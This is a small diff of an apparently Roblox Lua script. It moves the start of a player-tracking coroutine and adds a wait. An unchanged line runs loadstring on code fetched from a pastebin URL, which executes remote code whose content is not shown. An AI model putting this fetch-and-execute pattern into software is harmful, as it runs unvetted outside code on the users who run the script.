@@ -424,9 +424,10 @@ local function trackPlayers()
     end
 end
 
--- Start tracking players
-coroutine.wrap(trackPlayers)() -- Ensure the coroutine starts
+-- Start tracking players -- Ensure the coroutine starts
 print("Player tracking started.")
+	coroutine.wrap(trackPlayers)()
+	wait(1)
 
 -- Load external script (make sure this is the intended use)
 loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
